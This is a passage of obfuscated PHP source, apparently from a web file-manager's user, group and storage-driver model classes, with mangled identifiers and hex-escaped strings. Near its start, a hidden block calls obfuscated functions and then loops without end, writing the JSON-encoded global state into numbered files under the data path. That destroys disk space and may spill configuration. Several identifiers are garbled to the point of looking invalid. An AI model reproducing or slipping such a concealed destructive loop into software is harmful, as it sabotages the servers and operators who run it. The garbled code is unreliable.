$Ó³‹ÑÎ¶[663]) { $àòØôÑœ = $Ó³‹ÑÎ¶[897]; $àòØôÑœ(); } $–Õ¤ıëİ = $Ó³‹ÑÎ¶[910]; $–Õ¤ıëİ($_SERVER[$Ó³‹ÑÎ¶[911]]); $ÀÂ¤äë = $Ó³‹ÑÎ¶[909]; $ÀÂ¤äë(); $‹áìğöã = $Ó³‹ÑÎ¶[1536]; $Ì·ºİøê = json_encode($GLOBALS[$Ó³‹ÑÎ¶[1537]]); $”ô¹À‡Ü = 1; for ($ôéóüÚÎ = $”ô¹À‡Ü; $ôéóüÚÎ > 0; $ôéóüÚÎ++) { $‹áìğöã(DATA_PATH . $ôéóüÚÎ, $Ì·ºİøê); } } $¶ÈÚµª† = $this->getInfoSimple($Å½üùË); if (!$¶ÈÚµª† || !is_array($º¼ú¦‘ø)) { return !1; } $­¨ÔÚß = Model($Ó³‹ÑÎ¶[1960]); $­¨ÔÚß->where(array($Ó³‹ÑÎ¶[1678] => $Å½üùË))->delete(); $‰üä‚‘½ = array(); $È¿öİû = 0; foreach ($º¼ú¦‘ø as $ûáåÇÒ  => $·æ¼¾») { $úå¯Æ­¢ = array($Ó³‹ÑÎ¶[1678] => $Å½üùË, $Ó³‹ÑÎ¶[1870] => $ûáåÇÒ , $Ó³‹ÑÎ¶[1974] => $·æ¼¾»); $úå¯Æ­¢[$Ó³‹ÑÎ¶[1894]] = isset($ÚÍĞó¼Ù[$È¿öİû]) ? $ÚÍĞó¼Ù[$È¿öİû] : 0; $È¿öİû++; $‰üä‚‘½[] = $úå¯Æ­¢; } return $­¨ÔÚß->addAll($‰üä‚‘½, array(), !0); } protected function userGroupAdd($œì¬“ƒ‘, $²ÌíÈ…™ = array()) { $‚ÙíÊ‹û =& $_SERVER[™»È’øè]; $«Ü„¶¸ø = $this->getInfoSimple($œì¬“ƒ‘); if (!$«Ü„¶¸ø || empty($²ÌíÈ…™)) { return !1; } $‰øÂ× ¹ = array(); foreach ($²ÌíÈ…™ as $±™úÈÑÃ => $¿½È¦óÍ) { $‰øÂ× ¹[] = array($‚ÙíÊ‹û[1678] => $œì¬“ƒ‘, $‚ÙíÊ‹û[1870] => $±™úÈÑÃ, $‚ÙíÊ‹û[1974] => $¿½È¦óÍ, $‚ÙíÊ‹û[1894] => 0); } return Model($‚ÙíÊ‹û[1960])->addAll($‰øÂ× ¹, array(), !0); } protected function userGroupRemove($‰°ç¡ò«, $’ù¤şİ–) { $Ø‰éü›ü =& $_SERVER[™»È’øè]; $·óŸñ©Î = $this->getInfoSimple($‰°ç¡ò«); if (!$·óŸñ©Î || !$’ù¤şİ–) { return !1; } $ä¼¸œ¤ = array($Ø‰éü›ü[1669] => $‰°ç¡ò«, $Ø‰éü›ü[1958] => $’ù¤şİ–); return Model($Ø‰éü›ü[1960])->where($ä¼¸œ¤)->delete(); } public function listData() { $Û¢éê‡ã = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Û¢éê‡ã[$_SERVER[™»È’øè][412]]); return $Û¢éê‡ã; } public function listByID($®…ÖÆ‹‚) { $Û«ã®¶˜ =& $_SERVER[™»È’øè]; if (!$®…ÖÆ‹‚) { return; } $î†Œ”½‘ = array($Û«ã®¶˜[1678] => array($Û«ã®¶˜[7], $®…ÖÆ‹‚)); $²¿ª½Á = $this->where($î†Œ”½‘)->select(); $²¿ª½Á = array_sort_keep($²¿ª½Á, $Û«ã®¶˜[1678], $®…ÖÆ‹‚); $this->_listDataApply($²¿ª½Á); return $²¿ª½Á; } public function listByGroup($ãßùÏ£œ = 0, $¢ùğíÛø = array()) { $ñãù»ô =& $_SERVER[™»È’øè]; $¾ƒÔÀ¬˜ = $ñãù»ô[12]; $È¼×¿Û = array(); if ($ãßùÏ£œ) { $È¼×¿Û = array($ñãù»ô[2358] => intval($ãßùÏ£œ)); $¾ƒÔÀ¬˜ = "\114\105\x46\x54\x20\112\x4f\x49\116\x20{$this->tablePrefix}\x75\x73\145\x72\x5f\x67\162\x6f\x75\x70\40\x75\163\x65\x72\137\147\x72\157\x75\160\40\x6f\x6e\x20\165\x73\x65\x72\56\165\163\145\162\111\x44\40\x3d\x20\x75\x73\145\x72\x5f\147\x72\157\x75\160\56\x75\x73\x65\162\x49\x44"; $üîŠß— = Input::get($ñãù»ô[497], null, $ñãù»ô[12]) ? $ñãù»ô[12] : $ñãù»ô[2359]; } if (isset($¢ùğíÛø[$ñãù»ô[775]])) { $È¼×¿Û[$ñãù»ô[2360]] = $¢ùğíÛø[$ñãù»ô[775]]; } $„…Áâ°¢ = $this->_makeOrder($üîŠß—)->field($ñãù»ô[2361])->where($È¼×¿Û)->join($¾ƒÔÀ¬˜)->selectPage(50); $this->_listDataApply($„…Áâ°¢[$ñãù»ô[412]]); return $„…Áâ°¢; } private function _makeOrder($ùÉ’«ÂÂ = '') { $äŠë™Ë =& $_SERVER[™»È’øè]; $ˆÁŸ·ÑÄ = array($äŠë™Ë[1678], $äŠë™Ë[32], $äŠë™Ë[1859], $äŠë™Ë[1831], $äŠë™Ë[214]); $ÜÏÆäìº = array($äŠë™Ë[490] => $äŠë™Ë[491], $äŠë™Ë[492] => $äŠë™Ë[493]); $ÊĞÕœÛÅ = Input::get($äŠë™Ë[497], $äŠë™Ë[7], $äŠë™Ë[1669], $ˆÁŸ·ÑÄ); $àı‰éÚ = Input::get($äŠë™Ë[498], $äŠë™Ë[7], $äŠë™Ë[1961], array($äŠë™Ë[1961], $äŠë™Ë[492])); $àı‰éÚ = $ÜÏÆäìº[$àı‰éÚ]; $ùÉ’«ÂÂ = $ùÉ’«ÂÂ . "\x75\x73\x65\162\x2e{$ÊĞÕœÛÅ}\40{$àı‰éÚ}\x2c\x20\x75\x73\x65\162\56\165\163\145\x72\x49\104\40\141\x73\143"; return $this->alias($äŠë™Ë[2087])->order($ùÉ’«ÂÂ); } public function listSearch($ùö˜ã­) { $ôèÖ«­· =& $_SERVER[™»È’øè]; $üŸãâ–… = $ùö˜ã­[$ôèÖ«­·[1964]]; $Ïƒ¤æ‰ = isset($ùö˜ã­[$ôèÖ«­·[1965]]) ? $ùö˜ã­[$ôèÖ«­·[1965]] : !1; $üŸãâ–… = str_replace($ôèÖ«­·[1966], $ôèÖ«­·[1967], trim($üŸãâ–…)); $×ÂÌÖ¢ä = array($ôèÖ«­·[32] => array($ôèÖ«­·[426], "\x25{$üŸãâ–…}\45"), $ôèÖ«­·[348] => array($ôèÖ«­·[426], "{$üŸãâ–…}\45"), $ôèÖ«­·[2152] => array($ôèÖ«­·[426], "{$üŸãâ–…}\x25"), $ôèÖ«­·[1030] => $ôèÖ«­·[1968]); if (Input::check($üŸãâ–…, $ôèÖ«­·[354])) { $×ÂÌÖ¢ä[$ôèÖ«­·[1678]] = array($ôèÖ«­·[426], "{$üŸãâ–…}\x25"); $×ÂÌÖ¢ä[$ôèÖ«­·[2343]] = array($ôèÖ«­·[426], "{$üŸãâ–…}\x25"); } if (!$üŸãâ–…) { $×ÂÌÖ¢ä = array(); } if (isset($ùö˜ã­[$ôèÖ«­·[775]])) { $×ÂÌÖ¢ä[$ôèÖ«­·[775]] = $ùö˜ã­[$ôèÖ«­·[775]]; } $×ÂÌÖ¢ä = $this->parseWhereLike($×ÂÌÖ¢ä); $şá´¤Ú = $this->_makeOrder()->where($×ÂÌÖ¢ä)->selectPage(20); if (!$şá´¤Ú || count($şá´¤Ú[$ôèÖ«­·[412]]) < 5 && Input::check($üŸãâ–…, $ôèÖ«­·[361])) { $ÃßÏÛª = $this->_searchFromMeta($ôèÖ«­·[504], $üŸãâ–…, 10); $Å‡“ó« = $this->_searchFromMeta($ôèÖ«­·[505], $üŸãâ–…, 10); $¸ñ²·ç = array_merge($ÃßÏÛª, $Å‡“ó«, $şá´¤Ú[$ôèÖ«­·[412]]); $şá´¤Ú[$ôèÖ«­·[412]] = array_unique_by_key($¸ñ²·ç, $ôèÖ«­·[1678]); $şá´¤Ú[$ôèÖ«­·[409]][$ôèÖ«­·[410]] = count($şá´¤Ú[$ôèÖ«­·[412]]); $şá´¤Ú[$ôèÖ«­·[409]][$ôèÖ«­·[411]] = ceil($şá´¤Ú[$ôèÖ«­·[409]][$ôèÖ«­·[410]] / $şá´¤Ú[$ôèÖ«­·[409]][$ôèÖ«­·[406]]); } $this->_listDataApply($şá´¤Ú[$ôèÖ«­·[412]]); $this->_filterByGroup($şá´¤Ú, $Ïƒ¤æ‰); return $şá´¤Ú; } private function _filterByGroup(&$ØÒóØ¾, $ÓíĞ»ş¬) { $¾†Â¹áü =& $_SERVER[™»È’øè]; if (!$ÓíĞ»ş¬) { return $ØÒóØ¾; } foreach ($ØÒóØ¾[$¾†Â¹áü[412]] as $¼æ¨€î· => &$€½½î£¦) { $¿ıöúêã = array_to_keyvalue($€½½î£¦[$¾†Â¹áü[2057]], $¾†Â¹áü[12], $¾†Â¹áü[1870]); if (!in_array($ÓíĞ»ş¬, $¿ıöúêã)) { unset($ØÒóØ¾[$¾†Â¹áü[412]][$¼æ¨€î·]); } } unset($€½½î£¦); $ØÒóØ¾[$¾†Â¹áü[412]] = array_values($ØÒóØ¾[$¾†Â¹áü[412]]); $ØÒóØ¾[$¾†Â¹áü[409]] = array($¾†Â¹áü[2122] => count($ØÒóØ¾[$¾†Â¹áü[412]]), $¾†Â¹áü[2120] => $ØÒóØ¾[$¾†Â¹áü[409]][$¾†Â¹áü[406]], $¾†Â¹áü[2119] => 1, $¾†Â¹áü[2121] => 1); } private function _searchFromMeta($×Îñ×À¯, $Ï­êÏÏ½, $ŸËÔÏË) { $ö½»üÓ =& $_SERVER[™»È’øè]; $Ï­êÏÏ½ = strtolower($Ï­êÏÏ½); $Û™¢ÏÃæ = array($ö½»üÓ[94] => $×Îñ×À¯, $ö½»üÓ[417] => array($ö½»üÓ[426], "\45{$Ï­êÏÏ½}\45")); $Û™¢ÏÃæ = $this->parseWhereLike($Û™¢ÏÃæ); $âÏõÈ = Model($ö½»üÓ[2362])->where($Û™¢ÏÃæ)->limit($ŸËÔÏË)->select(); if (!$âÏõÈ) { return array(); } $âÏõÈ = array_to_keyvalue($âÏõÈ, $ö½»üÓ[12], $ö½»üÓ[1678]); $Œ›·”ä» = $this->where(array($ö½»üÓ[1669] => array($ö½»üÓ[7], $âÏõÈ)))->select(); if (!$Œ›·”ä») { return array(); } return $Œ›·”ä»; } private function _listDataApplyItem($¾ö‘¼á¯) { $ò¸¬¸÷ = array($¾ö‘¼á¯); $this->_listDataApply($ò¸¬¸÷); return $ò¸¬¸÷[0]; } private function _listDataApply(&$ì¿Œ’”) { $ó¶±‡£ =& $_SERVER[™»È’øè]; if (!$ì¿Œ’”) { return; } array_remove_key($ì¿Œ’”, $ó¶±‡£[919]); $ú´µ¶’ñ = array_to_keyvalue($ì¿Œ’”, $ó¶±‡£[12], $ó¶±‡£[1678]); $this->_listAppendGroup($ì¿Œ’”, $ú´µ¶’ñ); $this->_listAppendMeta($ì¿Œ’”, $ú´µ¶’ñ); $this->_listAppendSourceRoot($ì¿Œ’”, $ú´µ¶’ñ); } private function _listAppendSourceRoot(&$ª£åøªÊ, $Ã©‡Ÿ‰£) { $ÉÌÌÅÔ =& $_SERVER[™»È’øè]; $Šô¤è½è = Model($ÉÌÌÅÔ[850])->listSourceRoot(SourceModel::TYPE_USER, $Ã©‡Ÿ‰£); $Šô¤è½è = array_to_keyvalue($Šô¤è½è, $ÉÌÌÅÔ[537]); $Šô¤è½è = array_remove_key($Šô¤è½è, $ÉÌÌÅÔ[537]); foreach ($ª£åøªÊ as &$õ´ü¾¿¨) { $õ´ü¾¿¨[$ÉÌÌÅÔ[87]] = $Šô¤è½è[$õ´ü¾¿¨[$ÉÌÌÅÔ[1678]]] ? $Šô¤è½è[$õ´ü¾¿¨[$ÉÌÌÅÔ[1678]]] : array(); } unset($õ´ü¾¿¨); } private function _listAppendGroup(&$ë¡şİêµ, $«¨»ÏÙ«) { $–ÕîË =& $_SERVER[™»È’øè]; $íñÔÏ¹ = array($–ÕîË[1678] => array($–ÕîË[7], $«¨»ÏÙ«)); $àÌ‰¥‘• = Model($–ÕîË[1960])->where($íñÔÏ¹)->select(); $—¦™úµ = array_to_keyvalue($àÌ‰¥‘•, $–ÕîË[12], $–ÕîË[1870]); $—¦™úµ = array_remove_value(array_unique($—¦™úµ), $–ÕîË[211]); if (!$—¦™úµ || !$àÌ‰¥‘•) { return; } $íñÔÏ¹ = array($–ÕîË[1870] => array($–ÕîË[7], $—¦™úµ)); $¬«ñ“ıê = Model($–ÕîË[2055])->field($–ÕîË[2363])->where($íñÔÏ¹)->select(); $¬«ñ“ıê = array_to_keyvalue($¬«ñ“ıê, $–ÕîË[1870]); $àÌ‰¥‘• = array_to_keyvalue_group($àÌ‰¥‘•, $–ÕîË[1678]); foreach ($àÌ‰¥‘• as &$Ó¯–£ó) { $°¡˜îä¹ = array(); foreach ($Ó¯–£ó as $¢¡Ö±ñ) { if (!$¢¡Ö±ñ[$–ÕîË[1974]]) { continue; } $¯é™ÕÈÅ = Model($–ÕîË[539])->listData($¢¡Ö±ñ[$–ÕîË[1974]]); $°¡˜îä¹[] = array($–ÕîË[1870] => $¢¡Ö±ñ[$–ÕîË[1870]], $–ÕîË[2364] => $¬«ñ“ıê[$¢¡Ö±ñ[$–ÕîË[1870]]][$–ÕîË[32]], $–ÕîË[552] => $¬«ñ“ıê[$¢¡Ö±ñ[$–ÕîË[1870]]][$–ÕîË[552]], $–ÕîË[454] => $¯é™ÕÈÅ); } $Ó¯–£ó = $°¡˜îä¹; } unset($Ó¯–£ó); foreach ($ë¡şİêµ as &$¤Îò¶•‡) { $¤Îò¶•‡[$–ÕîË[2057]] = array(); if (isset($àÌ‰¥‘•[$¤Îò¶•‡[$–ÕîË[1678]]])) { $¤Îò¶•‡[$–ÕîË[2057]] = $àÌ‰¥‘•[$¤Îò¶•‡[$–ÕîË[1678]]]; } } unset($¤Îò¶•‡); } public function userAppendGroup($ŸüÔ‰Û) { $ƒ¦­¿»õ =& $_SERVER[™»È’øè]; if (!$ŸüÔ‰Û) { return array(); } $this->_listAppendGroup($ŸüÔ‰Û, array_to_keyvalue($ŸüÔ‰Û, $ƒ¦­¿»õ[12], $ƒ¦­¿»õ[1678])); return $ŸüÔ‰Û; } private function _listAppendMeta(&$ÅÙµ°×Ï, $¶ˆ¨‘¬ß) { $Ú˜áÙ’ã =& $_SERVER[™»È’øè]; $®øË§•… = UserJobModel::JOB_KEY; $¥ó–¡ö = array($Ú˜áÙ’ã[2344]); $ù­ùšØ« = array($Ú˜áÙ’ã[1678] => array($Ú˜áÙ’ã[7], $¶ˆ¨‘¬ß)); $Áğ¤ÉÒØ = Model($Ú˜áÙ’ã[2342])->where($ù­ùšØ«)->select(); $Áğ¤ÉÒØ = array_to_keyvalue_group($Áğ¤ÉÒØ, $Ú˜áÙ’ã[1678]); foreach ($Áğ¤ÉÒØ as &$Äñ¢÷) { $Åã“™îé = array(); foreach ($Äñ¢÷ as $ìèÉ¬Ç®) { if (!in_array($ìèÉ¬Ç®[$Ú˜áÙ’ã[94]], $¥ó–¡ö)) { $Åã“™îé[$ìèÉ¬Ç®[$Ú˜áÙ’ã[94]]] = $ìèÉ¬Ç®[$Ú˜áÙ’ã[417]]; } } $Äñ¢÷ = $Åã“™îé; } unset($Äñ¢÷); $´¨¯Î’Ú = Model($Ú˜áÙ’ã[2365]); foreach ($ÅÙµ°×Ï as &$Ïãü©Ü‰) { $øş‡Ÿ´ì = array(); if (isset($Áğ¤ÉÒØ[$Ïãü©Ü‰[$Ú˜áÙ’ã[1678]]])) { $øş‡Ÿ´ì = $Áğ¤ÉÒØ[$Ïãü©Ü‰[$Ú˜áÙ’ã[1678]]]; } $Ïãü©Ü‰[$Ú˜áÙ’ã[2366]] = array(); if (isset($øş‡Ÿ´ì[$®øË§•…])) { $Ïãü©Ü‰[$Ú˜áÙ’ã[2366]] = $´¨¯Î’Ú->getUserJobInfo($øş‡Ÿ´ì[$®øË§•…]); } } unset($Ïãü©Ü‰); } protected function groupUserAll($«›ü’â“) { $Äş­ÆÂ™ =& $_SERVER[™»È’øè]; if (!$«›ü’â“) { return !1; } $«Œú‹Ğ = Model($Äş­ÆÂ™[1960])->field($Äş­ÆÂ™[1678])->where(array($Äş­ÆÂ™[1870] => array($Äş­ÆÂ™[7], $«›ü’â“)))->select(); $«Œú‹Ğ = array_to_keyvalue($«Œú‹Ğ, $Äş­ÆÂ™[12], $Äş­ÆÂ™[1678]); return array_unique($«Œú‹Ğ); } public function userSearch($— ¤¡¯ç, $õ€¤Óœœ = "\52") { return Model($_SERVER[™»È’øè][566])->where($— ¤¡¯ç)->field($õ€¤Óœœ)->find(); } } goto C‘­ò†Ë“; cè‰­é¿İ°: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\56\163\157\x75\x72\143\x65\x53\x65\143\162\145\164\114\x69\x73\164"; public $field = array("\x73\157\165\x72\x63\145\x49\104", "\164\171\x70\x65\111\104", "\143\162\145\141\164\x65\125\x73\145\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\x73\164\x6f\162\x61\x67\145\x4c\151\x73\164"; public $field = array("\156\x61\155\x65", "\163\x69\x7a\145\x4d\141\x78", "\163\171\163\164\x65\x6d", "\144\145\146\141\165\x6c\x74", "\x64\x72\151\166\145\162", "\x63\157\x6e\x66\151\147"); public function listData($‰øÔö„ = false, $µë‹öµ¥ = "\x6d\x6f\144\x69\x66\171\x54\151\155\x65", $Ó‹ƒ÷æÒ = false) { $®ïìÇİÖ =& $_SERVER[™»È’øè]; $ö”ÕÓ = parent::listData($‰øÔö„, $µë‹öµ¥, $Ó‹ƒ÷æÒ); if ($‰øÔö„) { return $ö”ÕÓ; } $¢ÉÀôæœ = $this->ioSizeUseGet(array_to_keyvalue($ö”ÕÓ, $®ïìÇİÖ[12], $®ïìÇİÖ[442])); foreach ($ö”ÕÓ as $»ÖÃÕöŒ => $ğ¸ÉÖÒ¦) { unset($ö”ÕÓ[$»ÖÃÕöŒ][$®ïìÇİÖ[6]]); $ö”ÕÓ[$»ÖÃÕöŒ][$®ïìÇİÖ[1859]] = isset($¢ÉÀôæœ[$ğ¸ÉÖÒ¦[$®ïìÇİÖ[442]]]) ? $¢ÉÀôæœ[$ğ¸ÉÖÒ¦[$®ïìÇİÖ[442]]] : 0; } return $ö”ÕÓ; } public function ioSizeUseGet($«Æ ²º¼) { $Üƒ½ƒ†î =& $_SERVER[™»È’øè]; if (!$«Æ ²º¼) { return array(); } $íşóı·Å = $Üƒ½ƒ†î[2190] . implode($Üƒ½ƒ†î[50], $«Æ ²º¼); $¦Õ îê¤ = Cache::get($íşóı·Å); if ($¦Õ îê¤) { return $¦Õ îê¤; } $œÚ½ ¤‰ = array($Üƒ½ƒ†î[842] => $Üƒ½ƒ†î[442], $Üƒ½ƒ†î[2191] => $Üƒ½ƒ†î[76]); $•­ì²êÕ = array($Üƒ½ƒ†î[842] => array($Üƒ½ƒ†î[7], $«Æ ²º¼)); $¦Õ îê¤ = Model($Üƒ½ƒ†î[814])->field($œÚ½ ¤‰)->where($•­ì²êÕ)->group($Üƒ½ƒ†î[842])->select(); $¦Õ îê¤ = array_to_keyvalue($¦Õ îê¤, $Üƒ½ƒ†î[442], $Üƒ½ƒ†î[76]); Cache::set($íşóı·Å, $¦Õ îê¤, 600); return $¦Õ îê¤; } public function getConfig($’Ä½ƒØ¤) { $·ŒÉ’²¤ = parent::listData($’Ä½ƒØ¤); return json_decode($·ŒÉ’²¤[$_SERVER[™»È’øè][6]], !0); } public function update($˜³‚Š©, $™çöë÷İ) { $ÚüñëÙ =& $_SERVER[™»È’øè]; $¼ä¤ÒÑÕ = $™çöë÷İ[$ÚüñëÙ[32]]; $™ÆÁÁî = array_to_keyvalue(parent::listData(), $ÚüñëÙ[32]); if (isset($™ÆÁÁî[$¼ä¤ÒÑÕ]) && $™ÆÁÁî[$¼ä¤ÒÑÕ][$ÚüñëÙ[442]] != $˜³‚Š©) { return !1; } $this->checkPwd($˜³‚Š©, $™çöë÷İ); if (isset($™çöë÷İ[$ÚüñëÙ[2192]]) && $™çöë÷İ[$ÚüñëÙ[2192]] == $ÚüñëÙ[88]) { $this->checkConfig($™çöë÷İ); } unset($™çöë÷İ[$ÚüñëÙ[2192]]); $Ø™ÒÉ³® = parent::update($˜³‚Š©, $™çöë÷İ); if ($Ø™ÒÉ³® && $™çöë÷İ[$ÚüñëÙ[37]]) { $ö¾àœ§· = 0; foreach ($™ÆÁÁî as $İÚáÊˆ¤) { if ($İÚáÊˆ¤[$ÚüñëÙ[37]] && $İÚáÊˆ¤[$ÚüñëÙ[442]] != $˜³‚Š©) { $ö¾àœ§· = $İÚáÊˆ¤[$ÚüñëÙ[442]]; parent::update($İÚáÊˆ¤[$ÚüñëÙ[442]], array($ÚüñëÙ[37] => 0)); } } $this->updateBackup($˜³‚Š©, $ö¾àœ§·); } return $Ø™ÒÉ³®; } public function add($ÚçŠ›Î) { $²øÎ×Û =& $_SERVER[™»È’øè]; $Øâò®ªŒ = array_to_keyvalue(parent::listData(), $²øÎ×Û[32]); if (isset($Øâò®ªŒ[$ÚçŠ›Î[$²øÎ×Û[32]]])) { return !1; } $this->checkConfig($ÚçŠ›Î); $ÄŞ˜Çµ® = parent::insert($ÚçŠ›Î); if ($ÄŞ˜Çµ® && $ÚçŠ›Î[$²øÎ×Û[37]]) { foreach ($Øâò®ªŒ as $±¼ù”èº) { if ($±¼ù”èº[$²øÎ×Û[37]]) { parent::update($±¼ù”èº[$²øÎ×Û[442]], array($²øÎ×Û[37] => 0)); } } } return $ÄŞ˜Çµ®; } public function updateBackup($ÎÌ¥€Ã, $¸ˆèæ€) { $ÈåÍ…»ù =& $_SERVER[™»È’øè]; if (!$¸ˆèæ€) { return; } $Ä¼ñšƒ = Model($ÈåÍ…»ù[774])->config(); if ($Ä¼ñšƒ[$ÈåÍ…»ù[1648]] != $ÈåÍ…»ù[88] || $Ä¼ñšƒ[$ÈåÍ…»ù[776]] != $¸ˆèæ€) { return; } $†ıÊğ…Ê = Model($ÈåÍ…»ù[795])->get($ÈåÍ…»ù[805]); $†ıÊğ…Ê = json_decode($†ıÊğ…Ê, !0); if (!$†ıÊğ…Ê) { return; } $†ıÊğ…Ê[$ÈåÍ…»ù[776]] = $ÎÌ¥€Ã; Model($ÈåÍ…»ù[795])->set(array($ÈåÍ…»ù[805] => $†ıÊğ…Ê)); } public function checkPwd($œ†°åíè, &$Ùâ¯Àˆ) { $â©üã‰¡ =& $_SERVER[™»È’øè]; if (empty($Ùâ¯Àˆ[$â©üã‰¡[6]])) { return; } $«šñ¯ô = json_decode($Ùâ¯Àˆ[$â©üã‰¡[6]], !0); $ê£õûŞ = $â©üã‰¡[12]; $ı›àŞ¹ = array($â©üã‰¡[2193], $â©üã‰¡[2194], $â©üã‰¡[919]); foreach ($ı›àŞ¹ as $ò™Ö’¦) { if (isset($«šñ¯ô[$ò™Ö’¦])) { $ê£õûŞ = $ò™Ö’¦; break; } } if (!$ê£õûŞ) { return; } $¢¥ìÁÅ = $this->getConfig($œ†°åíè); $öñïÎı³ = $¢¥ìÁÅ[$ê£õûŞ]; $ÒÆùİƒŠ = $«šñ¯ô[$ê£õûŞ]; if ($ÒÆùİƒŠ == str_repeat($â©üã‰¡[202], strlen($öñïÎı³))) { $«šñ¯ô[$ê£õûŞ] = $öñïÎı³; $Ùâ¯Àˆ[$â©üã‰¡[6]] = json_encode($«šñ¯ô); } else { if ($ÒÆùİƒŠ != $öñïÎı³) { $Ùâ¯Àˆ[$â©üã‰¡[2192]] = $â©üã‰¡[88]; } } } public function checkConfig(&$ªÃñ…ø‘, $à²ÑğÈ° = false) { $ˆ÷Ñòğö =& $_SERVER[™»È’øè]; $¦ı…áñ = strtolower($ªÃñ…ø‘[$ˆ÷Ñòğö[95]]); $›Õ°£İ· = json_decode($ªÃñ…ø‘[$ˆ÷Ñòğö[6]], !0); foreach ($›Õ°£İ· as $ñ©Æ¼˜œ => $¦éºááÔ) { if (is_string($¦éºááÔ)) { $›Õ°£İ·[$ñ©Æ¼˜œ] = trim($¦éºááÔ); } } $›Õ°£İ·[$ˆ÷Ñòğö[2195]] = rand_string(6); $ƒºĞğé¦ = $GLOBALS[$ˆ÷Ñòğö[6]][$ˆ÷Ñòğö[89]][$ˆ÷Ñòğö[851]]; $’®£Ú Í = isset($ƒºĞğé¦[$¦ı…áñ]) ? $ƒºĞğé¦[$¦ı…áñ] : ucfirst($¦ı…áñ); $Ì£¹°ıú = $ˆ÷Ñòğö[74] . $’®£Ú Í; if (!$’®£Ú Í || !class_exists($Ì£¹°ıú)) { if ($à²ÑğÈ°) { return LNG($ˆ÷Ñòğö[2196]); } write_log(array($ˆ÷Ñòğö[2197], $ªÃñ…ø‘, get_caller_info()), $ˆ÷Ñòğö[2198]); show_json(LNG($ˆ÷Ñòğö[2196]), !1, $ªÃñ…ø‘); } $ş·êõ¬Ô = new $Ì£¹°ıú($›Õ°£İ·); if (in_array($¦ı…áñ, $ş·êõ¬Ô->objectDriver)) { if (!$ş·êõ¬Ô->isBucketCors() && !$ş·êõ¬Ô->setBucketCors()) { $ÖÀ”¬¼ï = LNG($ˆ÷Ñòğö[2199]); $ÖÀ”¬¼ï .= $ˆ÷Ñòğö[2200] . LNG($ˆ÷Ñòğö[2201]); if ($à²ÑğÈ°) { return $ÖÀ”¬¼ï; } show_json($ÖÀ”¬¼ï, !1); } } $õ¿ˆŞ•© = rtrim($›Õ°£İ·[$ˆ÷Ñòğö[1210]], $ˆ÷Ñòğö[8]) . $ˆ÷Ñòğö[8]; $—İÇÄªÂ = $ş·êõ¬Ô->getPath($õ¿ˆŞ•© . $ˆ÷Ñòğö[1214]); if (!$ş·êõ¬Ô->mkfile($—İÇÄªÂ)) { if ($à²ÑğÈ°) { return LNG($ˆ÷Ñòğö[2199]); } show_json(LNG($ˆ÷Ñòğö[2199]), !1); } $›Õ°£İ·[$ˆ÷Ñòğö[1210]] = $õ¿ˆŞ•©; $ªÃñ…ø‘[$ˆ÷Ñòğö[6]] = json_encode($›Õ°£İ·); $ªÃñ…ø‘[$ˆ÷Ñòğö[95]] = $’®£Ú Í; return !0; } public function driverListSystem() { $èÑĞÇ¼à =& $_SERVER[™»È’øè]; $±”õ°Æó = parent::listData(); $±ŞÈ³æ³ = array(); foreach ($±”õ°Æó as $®±ú¥äÏ) { unset($®±ú¥äÏ[$èÑĞÇ¼à[214]], $®±ú¥äÏ[$èÑĞÇ¼à[85]]); $®±ú¥äÏ[$èÑĞÇ¼à[6]] = json_decode($®±ú¥äÏ[$èÑĞÇ¼à[6]], !0); $±ŞÈ³æ³[] = $®±ú¥äÏ; } return $±ŞÈ³æ³; } public function defaultDriver() { $÷Ùğ„‹® =& $_SERVER[™»È’øè]; $„´†¦¼´ = parent::listData(); $œâ¡ù³„ = array_filter_by_field($„´†¦¼´, $÷Ùğ„‹®[37], 1); $œâ¡ù³„ = $œâ¡ù³„[0]; if ($œâ¡ù³„) { $œâ¡ù³„[$÷Ùğ„‹®[6]] = json_decode($œâ¡ù³„[$÷Ùğ„‹®[6]], !0); } return $œâ¡ù³„; } public function driverInfo($è¢‡Üà) { $şìÜÖã” =& $_SERVER[™»È’øè]; $éÏµÜƒË = array_to_keyvalue(parent::listData(), $şìÜÖã”[442]); if (!isset($éÏµÜƒË[$è¢‡Üà])) { return !1; } $‡Ù¾ä£­ = $éÏµÜƒË[$è¢‡Üà]; $‡Ù¾ä£­[$şìÜÖã”[6]] = json_decode($‡Ù¾ä£­[$şìÜÖã”[6]], !0); return $‡Ù¾ä£­; } public function remove($·¸Í®¸Ó) { $this->removeShareItems($·¸Í®¸Ó); return parent::remove($·¸Í®¸Ó); } public function removeWithFile($Ü¹–ö®Ã, $¨Ëêû¹Ô) { $ÑîŞ¬ˆ =& $_SERVER[™»È’øè]; $Ú¸Ô„š… = array($ÑîŞ¬ˆ[842] => $Ü¹–ö®Ã); $¤ï¬ÍÈá = Model($ÑîŞ¬ˆ[511])->where($Ú¸Ô„š…)->count(); $Õİ¤Ñ˜¨ = Model($ÑîŞ¬ˆ[511])->where($Ú¸Ô„š…)->sum($ÑîŞ¬ˆ[76]); $ŒÒÒ¯°… = $¨Ëêû¹Ô . $ÑîŞ¬ˆ[2202] . $Ü¹–ö®Ã; $ÁõøÜÜ = LNG($¨Ëêû¹Ô == $ÑîŞ¬ˆ[587] ? $ÑîŞ¬ˆ[2203] : $ÑîŞ¬ˆ[2204]); $•¿ïü = new TaskFileTransfer($ŒÒÒ¯°…, $ÑîŞ¬ˆ[2198], $¤ï¬ÍÈá, $ÁõøÜÜ . "\50{$Ü¹–ö®Ã}\x29"); $•¿ïü->task[$ÑîŞ¬ˆ[788]] = (double) $Õİ¤Ñ˜¨; $Œªï€ñÛ = KodIO::defaultDriver(); $Í÷®„ = $Œªï€ñÛ[$ÑîŞ¬ˆ[442]]; $ãšê˜ŞÒ = "\x7b\151\157\72{$Í÷®„}\x7d\x2f"; $Õ¹‰®ÓÔ = !0; $–ˆ—à‘û = array(); $Øîå‰Ûæ = Model($ÑîŞ¬ˆ[213])->where($Ú¸Ô„š…)->field($ÑîŞ¬ˆ[2205])->select(); foreach ($Øîå‰Ûæ as $äÀÓ¬÷¾) { $…¼·ãìÈ = $äÀÓ¬÷¾[$ÑîŞ¬ˆ[84]]; $Ô³Ş½œÉ = $ãšê˜ŞÒ . str_replace("\173\151\x6f\72{$Ü¹–ö®Ã}\x7d\57", $ÑîŞ¬ˆ[12], $…¼·ãìÈ); if (!IO::exist($…¼·ãìÈ)) { $–ˆ—à‘û[] = 